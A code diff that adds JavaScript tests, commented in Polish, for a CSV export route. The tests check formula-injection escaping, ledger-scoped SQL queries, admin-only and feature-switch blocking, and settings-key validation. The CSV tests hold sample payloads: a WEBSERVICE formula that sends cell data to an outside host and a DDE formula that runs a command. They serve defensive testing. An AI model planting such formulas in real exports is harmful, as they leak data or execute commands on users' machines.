@@ -156,6 +156,77 @@ function wywolajTrase(router, req, res) {
   rowne(res2.statusCode, 400, 'brak od/do → 400 (okres obowiązkowy dla każdego zbioru)');
   rowne(res2.body.error, 'bad_period', 'kod błędu bad_period');
 
+  // ---------- 7) CSV injection: formuły Excela/Sheets neutralizowane apostrofem ----------
+  // '=WEBSERVICE(...)' albo DDE '=cmd|...' wykonują się w arkuszu, jeśli otworzą się jako
+  // formuła — apostrof na początku każe Excelowi pokazać to jako TEKST, nie policzyć.
+  resetModuly();
+  const eksport2 = require('../src/routes/eksport');
+  const bezCudzyslowu = (s) => s.replace(/^"|"$/g, '');
+  for (const zly of ['=WEBSERVICE("https://zly.pl/?d="&A1)', '+1+1', '-2+3', '@SUM(A1)']) {
+    ok(bezCudzyslowu(eksport2.pole(zly)).startsWith(`'${zly[0]}`), `formuła zaczynająca się od "${zly[0]}" dostaje wiodący apostrof`);
+  }
+  ok(bezCudzyslowu(eksport2.pole('\tzatabowane')).startsWith("'\t"), 'prefiks TAB też neutralizowany');
+  ok(bezCudzyslowu(eksport2.pole('\rDDE')).startsWith("'\r"), 'prefiks CR też neutralizowany (i tak trafia w cudzysłów, bo CR jest separatorem)');
+  rowne(eksport2.pole('zwykły -1234,56 zł'), 'zwykły -1234,56 zł', '„-” W ŚRODKU pola (nie na początku) NIE jest formułą — zostaje bez zmian');
+  rowne(eksport2.pole("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1", 'DDE-formuła z apostrofami w treści: apostrof-prefiks wystarczy (pojedynczy cudzysłów nie jest separatorem CSV, więc bez dodatkowego cudzysłowu)');
+
+  // ---------- 8) zawężenie do ksiąg: KAŻDE zapytanie eksportu filtruje po ledger_id ----------
+  // Nie polegamy na tym, że jedyna rola przepuszczana przez admin-only to admin z [1,2] —
+  // funkcje pobierające SQL mają same wymusić IN(...) na podstawie przekazanego zasięgu.
+  resetModuly();
+  podstawDb();
+  const eksport3 = require('../src/routes/eksport');
+  zeruj([]);
+  await eksport3.pobierzKsiege('2026-07-01', '2026-07-31', null, [1]);
+  ok(/ledger_id IN \(1\)/.test(baza.zapytania[0].sql), 'pobierzKsiege z zasięgiem [1] generuje "ledger_id IN (1)"');
+  zeruj([]);
+  await eksport3.pobierzKsiege('2026-07-01', '2026-07-31', null, [1, 2]);
+  ok(/ledger_id IN \(1,2\)/.test(baza.zapytania[0].sql), 'pobierzKsiege z zasięgiem [1,2] generuje "ledger_id IN (1,2)" — nie samo "1"');
+  zeruj([]);
+  await eksport3.pobierzProdukty('2026-07-01', '2026-07-31', [1]);
+  ok(/r\.ledger_id IN \(1\)/.test(baza.zapytania[0].sql), 'pobierzProdukty też zawęża po r.ledger_id z przekazanego zasięgu');
+
+  // ---------- 9) testy NEGATYWNE przez CAŁĄ TRASĘ (łapią sabotaż admin-only/wyłącznika) ----------
+  resetModuly();
+  podstawDb();
+  const router3 = require('../src/routes/eksport');
+  zeruj([{ wlaczona: 1 }]); // modalność ON — same admin-only ma zablokować
+  const reqJunior = { method: 'GET', url: '/csv?zbior=ksiega&od=2026-07-01&do=2026-07-31',
+    query: { zbior: 'ksiega', od: '2026-07-01', do: '2026-07-31' }, user: { role: 'junior', uid: 9 } };
+  const resJunior = fakeRes();
+  await wywolajTrase(router3, reqJunior, resJunior);
+  rowne(resJunior.statusCode, 403, 'NEGATYWNY: user.role=junior przez CAŁĄ trasę → 403 (nie tylko admin przechodzi)');
+  rowne(resJunior.body && resJunior.body.error, 'admin_only', 'kod błędu admin_only');
+
+  resetModuly();
+  podstawDb();
+  const router4 = require('../src/routes/eksport');
+  zeruj([{ wlaczona: 0 }]); // modalność OFF — admin jest, ale wyłącznik ma zablokować
+  const reqAdminOff = { method: 'GET', url: '/csv?zbior=ksiega&od=2026-07-01&do=2026-07-31',
+    query: { zbior: 'ksiega', od: '2026-07-01', do: '2026-07-31' }, user: { role: 'admin', uid: 1 } };
+  const resAdminOff = fakeRes();
+  await wywolajTrase(router4, reqAdminOff, resAdminOff);
+  rowne(resAdminOff.statusCode, 503, 'NEGATYWNY: admin, ale modalność OFF, przez CAŁĄ trasę → 503');
+  rowne(resAdminOff.body && resAdminOff.body.error, 'modalnosc_wylaczona', 'kod błędu modalnosc_wylaczona');
+
+  // ---------- 10) wylaczniki.ustaw(): whitelist kluczy i affectedRows===0 nie są cichym no-op ----------
+  resetModuly();
+  const w4 = require('../src/wylaczniki');
+  zeruj();
+  let rzucilaLiterowka = false;
+  try { await w4.ustaw('ro-api', true, 1); } catch { rzucilaLiterowka = true; } // literówka: myślnik zamiast podkreślnika
+  ok(rzucilaLiterowka, 'ustaw() z nieznanym kluczem (literówka) RZUCA, nie cichy no-op');
+  ok(baza.zapytania.length === 0, 'nieznany klucz odrzucony PRZED dotknięciem bazy');
+
+  zeruj({ affectedRows: 0 }); // klucz poprawny wg whitelisty, ale wiersza w bazie nie ma (np. migracja niepełna)
+  let rzucilBrakWiersza = false;
+  try { await w4.ustaw('widget', true, 1); } catch { rzucilBrakWiersza = true; }
+  ok(rzucilBrakWiersza, 'ustaw() z affectedRows=0 RZUCA (wiersz nie istnieje w bazie), nie zwraca fałszywego sukcesu');
+
+  zeruj({ affectedRows: 1 });
+  const wynik = await w4.ustaw('eksport_csv', true, 1);
+  ok(wynik === true, 'ustaw() na poprawnym kluczu z affectedRows=1 kończy się sukcesem');
+
   console.log(`\n${bledy === 0 ? 'OK' : 'BŁĄD'}: test-rejestry — ${bledy} błędów`);
   process.exit(bledy === 0 ? 0 : 1);
 })();
